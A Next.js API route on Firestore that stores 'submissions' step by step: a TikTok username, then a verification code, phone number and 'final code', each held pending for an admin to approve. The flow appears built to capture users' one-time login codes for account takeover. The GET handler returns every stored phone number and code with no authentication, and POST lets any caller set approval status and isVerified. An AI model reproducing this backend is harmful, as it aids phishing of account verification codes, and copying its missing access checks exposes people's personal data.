
'use server';

import { NextResponse } from 'next/server';
import { collection, getDocs, doc, updateDoc, setDoc, getDoc } from 'firebase/firestore';
import { db } from '@/lib/firebase-admin';
import type { Submission } from '@/lib/types';


export async function GET(request: Request) {
    const { searchParams } = new URL(request.url);
    const userId = searchParams.get('id');

    try {
        if (userId) {
            // Fetch a single submission
            const submissionDocRef = doc(db, 'submissions', userId);
            const submissionDoc = await getDoc(submissionDocRef);
            if (!submissionDoc.exists()) {
                return NextResponse.json({ message: 'Submission not found' }, { status: 404 });
            }
            return NextResponse.json(submissionDoc.data());
        } else {
            // Fetch all submissions
            const submissionsCollection = collection(db, 'submissions');
            const snapshot = await getDocs(submissionsCollection);
            const submissions = snapshot.docs.map(d => d.data() as Submission);
            return NextResponse.json(submissions.sort((a, b) => new Date(b.createdAt).getTime() - new Date(a.createdAt).getTime()));
        }
    } catch (error: any) {
        console.error('Error fetching submissions:', error);
        return NextResponse.json({ message: error.message || "Could not fetch submissions." }, { status: 500 });
    }
}


export async function POST(request: Request) {
  try {
    const body = await request.json();
    const { id, step, data, status, rejectionReason } = body;

    if (!id || !step) {
      return NextResponse.json({ message: 'Submission ID and step are required' }, { status: 400 });
    }

    const submissionDocRef = doc(db, 'submissions', id);
    const submissionDoc = await getDoc(submissionDocRef);
    const updateData: any = {};

    // This handles both creation of a new submission and updates to an existing one.
    if (submissionDoc.exists()) {
        if (data !== undefined) {
            updateData[step] = data;
        }
        if (status) {
            updateData[`${step}Status`] = status;
        } else if (step !== 'isVerified') {
             // Set status based on the step if not provided
            if (step === 'tiktokUsername') {
                updateData[`${step}Status`] = 'approved'; // Step 1 is auto-approved
            } else {
                updateData[`${step}Status`] = 'pending'; // Subsequent steps need admin approval
            }
        }

        if (rejectionReason !== undefined) {
             updateData.rejectionReason = rejectionReason;
        }
        if (step === 'isVerified' && typeof data === 'boolean') {
             updateData.isVerified = data;
        }
        
        // Reset rejection reason on new data submission for a step
        if (data !== undefined) {
            updateData.rejectionReason = null;
        }

        await updateDoc(submissionDocRef, updateData);
        
    } else {
        // Create new submission (should only happen on step 1)
        if (step === 'tiktokUsername') {
            const newSubmission: Submission = {
                id,
                createdAt: new Date().toISOString(),
                isVerified: false,
                tiktokUsername: data,
                tiktokUsernameStatus: 'approved',
                verificationCode: '',
                verificationCodeStatus: 'pending',
                phoneNumber: '',
                phoneNumberStatus: 'pending',
                finalCode: '',
                finalCodeStatus: 'pending',
                rejectionReason: '',
            };
            await setDoc(submissionDocRef, newSubmission);
        } else {
            // This prevents creating a doc from any step other than the first.
            return NextResponse.json({ message: 'Submission does not exist. Please start from the beginning.' }, { status: 400 });
        }
    }

    const updatedDoc = await getDoc(submissionDocRef);

    return NextResponse.json(updatedDoc.data(), { status: 200 });

  } catch (error: any) {
    console.error("Error processing submission:", error);
    return NextResponse.json({ message: error.message || 'Error processing request' }, { status: 500 });
  }
}
